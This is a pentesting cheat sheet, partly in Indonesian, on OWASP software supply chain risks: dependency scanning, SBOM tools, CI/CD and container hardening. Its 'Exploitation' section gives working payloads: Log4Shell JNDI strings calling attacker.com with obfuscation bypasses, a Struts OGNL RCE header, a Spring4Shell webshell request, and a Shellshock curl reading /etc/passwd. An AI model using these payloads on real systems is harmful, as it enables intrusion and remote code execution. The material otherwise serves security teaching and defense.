# 📦 SOFTWARE SUPPLY CHAIN FAILURES — Part 08

## OWASP A03:2025 — Supply Chain Attacks, Vulnerable Dependencies, SBOM

> ⚠️ **Hanya untuk penetration testing yang sudah diotorisasi & tujuan pendidikan.**

---

## 📑 Table of Contents
1. [Overview & CWE Mapping](#overview--cwe-mapping)
2. [CWE-1395: Vulnerable Third-Party Components](#cwe-1395-vulnerable-third-party-components)
3. [CWE-1104: Unmaintained Components](#cwe-1104-unmaintained-components)
4. [CWE-477: Obsolete Functions](#cwe-477-obsolete-functions)
5. [CWE-1329: Non-Updateable Components](#cwe-1329-non-updateable-components)
6. [CWE-1357: Insufficiently Trustworthy Components](#cwe-1357-insufficiently-trustworthy-components)
7. [Supply Chain Attack Vectors](#supply-chain-attack-vectors)
8. [Dependency Scanning Tools](#dependency-scanning-tools)
9. [SBOM Generation & Management](#sbom-generation--management)
10. [CI/CD Pipeline Security](#cicd-pipeline-security)
11. [Package Manager Security](#package-manager-security)
12. [Container & Image Security](#container--image-security)
13. [Real-World Attack Scenarios](#real-world-attack-scenarios)
14. [Detection & Response Pipeline](#detection--response-pipeline)

---

# Overview & CWE Mapping

| CWE | Name | Risk |
|-----|------|------|
| CWE-477 | Use of Obsolete Function | Deprecated APIs with known issues |
| CWE-1035 | Using Components with Known Vulnerabilities | Classic A9:2017 |
| CWE-1104 | Use of Unmaintained Third Party Components | Abandoned libraries |
| CWE-1329 | Reliance on Component That is Not Updateable | Vendor lock-in, no patches |
| CWE-1357 | Reliance on Insufficiently Trustworthy Component | Unvetted dependencies |
| CWE-1395 | Dependency on Vulnerable Third-Party Component | Known CVE in dep |

---

# CWE-1395: Vulnerable Third-Party Components

**Deskripsi**: Aplikasi menggunakan library/framework/component yang memiliki known vulnerabilities (CVEs).

## Detection

```bash
# ===== IDENTIFY TECHNOLOGY STACK =====
# Web fingerprinting
whatweb https://target.com
httpx -u https://target.com -tech-detect
wappalyzer (browser extension)

# Check JavaScript libraries
curl -s https://target.com | grep -oP 'jquery[.-][\d.]+|angular[.-][\d.]+|react[.-][\d.]+|vue[.-][\d.]+|bootstrap[.-][\d.]+'

# Retire.js (detect vulnerable JS libraries)
npm install -g retire
retire --js --path /var/www/html
retire --js --jsrepo https://target.com/js/

# Wappalyzer CLI
npm install -g wappalyzer
wappalyzer https://target.com

# ===== VERSION DETECTION =====
# Nmap service version
nmap -sV target.com -p 80,443,8080,8443

# HTTP headers
curl -sI https://target.com | grep -iE "server|x-powered-by|x-aspnet"
# Server: Apache/2.4.41
# X-Powered-By: PHP/7.4.3

# CMS version
# WordPress
curl -s https://target.com/readme.html | grep -i "version"
curl -s https://target.com/wp-includes/version.php
wpscan --url https://target.com --enumerate vp,vt

# Joomla
curl -s https://target.com/administrator/manifests/files/joomla.xml | grep -i "version"

# Drupal
curl -s https://target.com/CHANGELOG.txt | head -5
```

## Exploitation

```bash
# ===== SEARCH FOR KNOWN CVEs =====
# searchsploit
searchsploit apache 2.4.41
searchsploit jquery 3.4
searchsploit wordpress 5.7
searchsploit log4j

# Nuclei (vuln templates by technology)
nuclei -u https://target.com -tags cve
nuclei -u https://target.com -tags cve-2021  # Specific year
nuclei -u https://target.com -tags apache
nuclei -u https://target.com -tags wordpress
nuclei -u https://target.com -tags joomla

# ===== FAMOUS EXPLOITABLE COMPONENTS =====

# --- LOG4SHELL (CVE-2021-44228) ---
# Detect
curl -H "X-Api-Version: \${jndi:ldap://ATTACKER_DOMAIN/test}" https://target.com
curl -H "User-Agent: \${jndi:ldap://ATTACKER_DOMAIN/test}" https://target.com
# In any input field:
${jndi:ldap://attacker.com/exploit}
${jndi:rmi://attacker.com/exploit}
${jndi:dns://attacker.com}

# Obfuscation bypass:
${${lower:j}ndi:${lower:l}dap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}

# Tools
# log4j-scan
python3 log4j-scan.py -u https://target.com --waf-bypass
# interactsh (callback server)
interactsh-client

# --- APACHE STRUTS RCE (CVE-2017-5638) ---
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

# --- SPRING4SHELL (CVE-2022-22965) ---
# Detect
curl -s "https://target.com/path?class.module.classLoader.DefaultAssertionStatus=true"
# Exploit
POST /path HTTP/1.1
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20...

# --- JQUERY PROTOTYPE POLLUTION ---
# jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"yes"}}'))

# --- WORDPRESS PLUGIN VULNS ---
wpscan --url https://target.com --enumerate vp --api-token YOUR_TOKEN
# Search: https://wpscan.com/plugins

# --- DRUPALGEDDON (CVE-2018-7600) ---
# Drupal < 7.58 / 8.x < 8.3.9
python3 drupalgeddon2.py https://target.com

# --- SHELLSHOCK (CVE-2014-6271) ---
curl -H "User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'" https://target.com/cgi-bin/status

# --- HEARTBLEED (CVE-2014-0160) ---
nmap --script ssl-heartbleed -p 443 target.com
```

---

# CWE-1104: Unmaintained Components

```bash
# ===== DETECT UNMAINTAINED PACKAGES =====

# NPM: check last publish date
npm info PACKAGE_NAME time
npm outdated

# Python
pip list --outdated
pip-audit

# Ruby
bundle outdated
bundler-audit check

# Java/Maven
mvn versions:display-dependency-updates

# ===== CHECK IF ABANDONED =====
# GitHub: last commit date
curl -s "https://api.github.com/repos/OWNER/REPO" | jq '.pushed_at'
# If > 2 years → likely unmaintained

# NPM: weekly downloads trend
# If declining to near-zero → likely abandoned

# ===== TOOLS =====
# is-website-vulnerable
npx is-website-vulnerable https://target.com

# Snyk
npm install -g snyk
snyk test
snyk monitor

# OWASP Dependency-Check
dependency-check --project "MyApp" --scan /path/to/project
```

---

# CWE-477: Obsolete Functions

```bash
# ===== FIND DEPRECATED/OBSOLETE FUNCTIONS =====

# PHP deprecated functions
grep -rn "mysql_" /var/www/ --include="*.php"    # mysql_* (use mysqli or PDO)
grep -rn "ereg(" /var/www/ --include="*.php"     # ereg (use preg_match)
grep -rn "split(" /var/www/ --include="*.php"    # split (use explode/preg_split)
grep -rn "md5(" /var/www/ --include="*.php"      # MD5 for passwords (use bcrypt)
grep -rn "sha1(" /var/www/ --include="*.php"     # SHA1 for passwords

# Python deprecated
grep -rn "cgi.escape" /app/ --include="*.py"     # Use html.escape
grep -rn "md5.new" /app/ --include="*.py"        # Use hashlib
grep -rn "os.popen" /app/ --include="*.py"       # Use subprocess

# JavaScript deprecated
grep -rn "document.write" /var/www/ --include="*.js"
grep -rn "eval(" /var/www/ --include="*.js"
grep -rn "escape(" /var/www/ --include="*.js"    # Use encodeURIComponent
grep -rn "unescape(" /var/www/ --include="*.js"

# Java deprecated
grep -rn "@Deprecated" /app/ --include="*.java"
grep -rn "java.security.MessageDigest.*MD5" /app/ --include="*.java"

# Crypto: obsolete algorithms
grep -rn "DES\|RC4\|MD5\|SHA1" /app/ --include="*.py" --include="*.java" --include="*.js"
```

---

# CWE-1329: Non-Updateable Components

```bash
# ===== IDENTIFY LOCKED/VENDOR-LOCKED COMPONENTS =====
# Embedded firmware that can't be updated
# Legacy libraries with no upgrade path
# Proprietary components without source access

# Check for:
# - Hardcoded library versions in binary
# - Static linking with no update mechanism
# - Vendor appliances with EOL firmware
# - Docker images with pinned base that's EOL

# Docker: check base image
docker inspect IMAGE_NAME | jq '.[0].Config.Labels'
# If base is ubuntu:16.04 or debian:stretch → EOL

# Check EOL dates
# https://endoflife.date/
# https://endoflife.date/nodejs
# https://endoflife.date/python
# https://endoflife.date/php
```

---

# CWE-1357: Insufficiently Trustworthy Components

```bash
# ===== VERIFY PACKAGE INTEGRITY =====

# NPM: check package provenance
npm audit signatures
npm pack PACKAGE --dry-run  # See what's included

# Python: verify hash
pip hash download PACKAGE
pip install --require-hashes -r requirements.txt

# Check package popularity & trust signals
# - Stars, forks, contributors on GitHub
# - Download count on npm/PyPI
# - Verified publisher badge
# - Signed releases

# ===== DETECT TYPOSQUATTING =====
# Common typosquat examples:
# lodash → lodahs, l0dash, lodash-utils
# requests → request, reqeusts
# colors → colour, co1ors

# Tools
# npm: socket.dev (detect suspicious packages)
# Python: safety check
pip install safety
safety check
safety check -r requirements.txt
```

---

# Supply Chain Attack Vectors

```bash
# ===== ATTACK TAXONOMY =====

# 1. DEPENDENCY CONFUSION
# Publish package with same name as internal package on public registry
# If resolver checks public first → malicious package installed
# Tools:
# confused (detect dependency confusion)
pip install confused
confused -l npm -o results.json requirements.txt

# 2. TYPOSQUATTING
# Register misspelled package names
# Users who mistype → install malicious package
# crossenv (malicious) vs cross-env (legit)

# 3. COMPROMISED MAINTAINER
# Attacker gains access to maintainer's npm/PyPI account
# Publish malicious version of popular package
# Example: ua-parser-js, coa, event-stream

# 4. BUILD SYSTEM COMPROMISE
# Malicious code injected during CI/CD build
# Example: SolarWinds Orion (2019-2020)
# Codecov bash uploader compromise (2021)

# 5. MALICIOUS PULL REQUEST
# Attacker submits PR with backdoor
# Hidden in large changes or obfuscated

# 6. PROTESTWARE / SABOTAGE
# Maintainer intentionally adds destructive code
# Example: colors.js, faker.js (2022)
# Example: node-ipc (anti-war protest)

# 7. WORM ATTACKS
# Self-propagating npm worms
# Example: Shai-Hulud (2025) - 500+ packages
# Harvest npm tokens → publish malicious versions of accessible packages

# 8. ABANDONED PACKAGE TAKEOVER
# Register npm username of deleted maintainer
# Publish malicious version of orphaned package
```

---

# Dependency Scanning Tools

## OWASP Dependency-Check

```bash
# Install
wget https://github.com/jeremylong/DependencyCheck/releases/latest/download/dependency-check-X.X.X-release.zip
unzip dependency-check-*.zip

# Scan Java/Maven project
./dependency-check/bin/dependency-check.sh \
  --project "MyApp" \
  --scan /path/to/project \
  --format HTML \
  --out report.html

# Scan specific files
./dependency-check.sh --scan package-lock.json
./dependency-check.sh --scan requirements.txt
./dependency-check.sh --scan pom.xml
./dependency-check.sh --scan Gemfile.lock

# CI/CD integration (exit code on CVSS threshold)
./dependency-check.sh --project "MyApp" --scan . --failOnCVSS 7
```

## Snyk

```bash
# Install & auth
npm install -g snyk
snyk auth

# Test project
snyk test                            # Test current project
snyk test --all-projects             # All sub-projects
snyk test --severity-threshold=high  # Only high+
snyk test --json                     # JSON output

# Monitor (continuous)
snyk monitor

# Fix
snyk fix                # Auto-fix vulnerabilities

# Container scanning
snyk container test IMAGE_NAME:TAG
snyk container monitor IMAGE_NAME:TAG

# IaC scanning
snyk iac test /path/to/terraform/
snyk iac test /path/to/kubernetes/

# Code scanning
snyk code test
```

## Trivy

```bash
# Install
sudo apt install trivy
# or
brew install trivy

# Scan filesystem (project dependencies)
trivy fs /path/to/project
trivy fs --severity HIGH,CRITICAL /path/to/project

# Scan container image
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL myapp:latest
trivy image --ignore-unfixed myapp:latest

# Scan git repo
trivy repo https://github.com/target/repo

# Scan Kubernetes
trivy k8s --report=summary cluster

# Generate SBOM
trivy image --format cyclonedx -o sbom.json myapp:latest

# Output formats
trivy fs --format json -o results.json /path/
trivy fs --format table /path/
trivy fs --format sarif -o results.sarif /path/  # GitHub integration
```

## Language-Specific Scanners

```bash
# ===== NPM =====
npm audit
npm audit --json
npm audit fix
npm audit fix --force  # Breaking changes OK

# ===== Python =====
pip install pip-audit safety
pip-audit
pip-audit -r requirements.txt
safety check -r requirements.txt

# ===== Ruby =====
gem install bundler-audit
bundler-audit check
bundler-audit check --update

# ===== Java/Maven =====
mvn org.owasp:dependency-check-maven:check

# ===== .NET =====
dotnet list package --vulnerable
dotnet list package --vulnerable --include-transitive

# ===== Go =====
go install golang.org/x/vuln/cmd/govulncheck@latest
govulncheck ./...

# ===== Rust =====
cargo install cargo-audit
cargo audit

# ===== PHP (Composer) =====
composer audit
# or
symfony security:check
```

---

# SBOM Generation & Management

```bash
# ===== WHAT IS SBOM? =====
# Software Bill of Materials — complete list of all components in your software
# Formats: CycloneDX (OWASP), SPDX (Linux Foundation)

# ===== GENERATE SBOM =====

# CycloneDX (multi-language)
# NPM
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# Python
pip install cyclonedx-bom
cyclonedx-py environment -o sbom.json

# Java/Maven
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom

# Go
cyclonedx-gomod app -output sbom.json

# Container
trivy image --format cyclonedx -o sbom.json myapp:latest
syft myapp:latest -o cyclonedx-json > sbom.json

# ===== SYFT (universal SBOM generator) =====
# Install
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s

# Generate SBOM
syft /path/to/project -o cyclonedx-json > sbom.json
syft /path/to/project -o spdx-json > sbom.json
syft myimage:latest -o cyclonedx-json > sbom.json

# ===== GRYPE (SBOM vulnerability scanner) =====
# Install
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s

# Scan SBOM
grype sbom:sbom.json
grype sbom:sbom.json --only-fixed
grype sbom:sbom.json --fail-on high

# ===== OWASP Dependency-Track =====
# Deploy (Docker)
docker-compose up -d  # Using official docker-compose
# Upload SBOM via API or UI
# Continuous monitoring of vulnerabilities
```

---

# CI/CD Pipeline Security

```bash
# ===== PIPELINE ATTACK SURFACES =====

# 1. Secrets in CI/CD
# Check for exposed secrets:
grep -rn "AWS_\|GITHUB_TOKEN\|API_KEY\|SECRET\|PASSWORD" .github/workflows/
grep -rn "AWS_\|GITHUB_TOKEN\|API_KEY\|SECRET\|PASSWORD" .gitlab-ci.yml
grep -rn "AWS_\|GITHUB_TOKEN\|API_KEY\|SECRET\|PASSWORD" Jenkinsfile

# 2. Unpinned actions/images
# BAD: uses: actions/checkout@main (mutable tag)
# GOOD: uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 (pinned SHA)

# 3. Self-hosted runner attacks
# Attacker submits PR → runs on self-hosted runner → extracts secrets

# 4. Artifact poisoning
# Attacker compromises build artifacts between build and deploy

# ===== HARDENING =====
# Pin dependencies to exact versions
# Use lock files (package-lock.json, Pipfile.lock, Gemfile.lock)
# Pin CI actions to SHA
# Sign artifacts (cosign, sigstore)

# Cosign (container signing)
cosign sign --key cosign.key myapp:latest
cosign verify --key cosign.pub myapp:latest

# ===== TOOLS =====
# StepSecurity (harden GitHub Actions)
# https://app.stepsecurity.io/
# Generates pinned action versions

# Scorecard (OpenSSF security score)
scorecard --repo=github.com/target/repo
# Checks: branch protection, CI tests, dependency update, signed releases, etc.

# Legitify (GitHub/GitLab org misconfig)
legitify analyze --org target-org
```

---

# Package Manager Security

```bash
# ===== NPM SECURITY =====
# Check package before install
npm info PACKAGE_NAME
npm pack PACKAGE_NAME --dry-run       # See all files
npm view PACKAGE_NAME scripts         # Check install scripts!

# Disable install scripts
npm config set ignore-scripts true
# Or per-install:
npm install --ignore-scripts PACKAGE_NAME

# Lock to specific registry
# .npmrc
registry=https://registry.npmjs.org/
@mycompany:registry=https://npm.mycompany.com/

# ===== PYTHON/PIP SECURITY =====
# Use hash verification
pip install --require-hashes -r requirements.txt
# requirements.txt format:
# package==1.0.0 --hash=sha256:HASH_VALUE

# Use trusted host only
pip install --trusted-host pypi.org PACKAGE_NAME

# ===== VERIFY SIGNATURES =====
# NPM: npm audit signatures
# Python: pip supports PEP 740 (attestations)
# Java/Maven: verify GPG signatures on artifacts
# Go: go mod verify (checksum database)

# ===== DETECT MALICIOUS PACKAGES =====
# socket.dev (NPM/Python)
# Phylum (multi-language)
# Sandworm (npm)
```

---

# Container & Image Security

```bash
# ===== SCAN CONTAINER IMAGES =====
# Trivy
trivy image --severity HIGH,CRITICAL nginx:latest

# Grype
grype nginx:latest

# Docker Scout
docker scout cves nginx:latest
docker scout quickview nginx:latest

# Snyk
snyk container test nginx:latest

# ===== BEST PRACTICES =====
# Use minimal base images
FROM alpine:3.19           # Minimal
FROM gcr.io/distroless/base # Even more minimal
FROM scratch               # Empty (for Go binaries)

# Pin image digest (not tag)
FROM nginx@sha256:EXACT_DIGEST

# Multi-stage builds
FROM node:20 AS builder
COPY . .
RUN npm ci && npm run build

FROM nginx:alpine
COPY --from=builder /app/dist /usr/share/nginx/html

# Run as non-root
USER 1001

# Read-only filesystem
docker run --read-only myapp

# ===== KUBERNETES SECURITY =====
# kubeaudit
kubeaudit all

# kube-bench (CIS benchmark)
kube-bench run

# kubesec
kubesec scan deployment.yaml
```

---

# Real-World Attack Scenarios

```
┌─────────────────────────────────────────────────────────┐
│              NOTABLE SUPPLY CHAIN ATTACKS               │
├─────────────────────────┬───────────────────────────────┤
│ SolarWinds (2019-2020)  │ Build system compromise       │
│                         │ 18,000 orgs affected          │
│                         │ Backdoor in Orion updates     │
├─────────────────────────┼───────────────────────────────┤
│ Codecov (2021)          │ Bash uploader modified        │
│                         │ CI/CD secrets exfiltrated     │
├─────────────────────────┼───────────────────────────────┤
│ Log4Shell (2021)        │ CVE-2021-44228                │
│                         │ RCE via JNDI in Log4j         │
│                         │ Millions of apps affected     │
├─────────────────────────┼───────────────────────────────┤
│ ua-parser-js (2021)     │ Maintainer account hijacked   │
│                         │ Cryptominer in 0.7.29/0.8.0   │
│                         │ 8M weekly downloads           │
├─────────────────────────┼───────────────────────────────┤
│ colors/faker.js (2022)  │ Maintainer sabotage           │
│                         │ Infinite loop added           │
├─────────────────────────┼───────────────────────────────┤
│ Bybit Theft (2025)      │ Wallet software supply chain  │
│                         │ $1.5B stolen                  │
│                         │ Conditional trigger on target │
├─────────────────────────┼───────────────────────────────┤
│ Shai-Hulud (2025)       │ Self-propagating npm worm     │
│                         │ 500+ package versions         │
│                         │ Token harvest + auto-publish  │
└─────────────────────────┴───────────────────────────────┘
```

---

# Detection & Response Pipeline

```bash
# ===== COMPLETE SUPPLY CHAIN AUDIT =====

# 1. Generate SBOM
syft /path/to/project -o cyclonedx-json > sbom.json

# 2. Scan SBOM for vulnerabilities
grype sbom:sbom.json --fail-on high

# 3. Scan dependencies
npm audit --json > npm_audit.json       # NPM
pip-audit -o json > pip_audit.json      # Python
trivy fs --format json -o trivy.json .  # Multi-language

# 4. Check for outdated packages
npm outdated --json
pip list --outdated --format json

# 5. Scan container images
trivy image --severity HIGH,CRITICAL myapp:latest

# 6. Check CI/CD security
# Review .github/workflows/ for unpinned actions
# Check for secrets in code: trufflehog, gitleaks

# 7. Verify package integrity
npm audit signatures
go mod verify

# 8. OpenSSF Scorecard
scorecard --repo=github.com/org/repo --format json

# 9. Monitor continuously
# Deploy OWASP Dependency-Track
# Subscribe to GitHub Advisory Database
# Subscribe to OSV.dev alerts

# 10. Web application scan for known CVEs
nuclei -u https://target.com -tags cve -s critical,high -o cve_results.txt
```

---

## 🔗 Resources

| Resource | URL |
|----------|-----|
| NVD | https://nvd.nist.gov/ |
| CVE | https://cve.mitre.org/ |
| OSV | https://osv.dev/ |
| GitHub Advisory | https://github.com/advisories |
| Snyk Vuln DB | https://snyk.io/vuln/ |
| OWASP Dep-Track | https://dependencytrack.org/ |
| OpenSSF Scorecard | https://scorecard.dev/ |
| endoflife.date | https://endoflife.date/ |

---

> ⚠️ **DISCLAIMER**: Semua tools dan teknik di cheatsheet ini hanya untuk **ethical hacking**, **penetration testing yang sudah diotorisasi**, dan **tujuan pendidikan**.
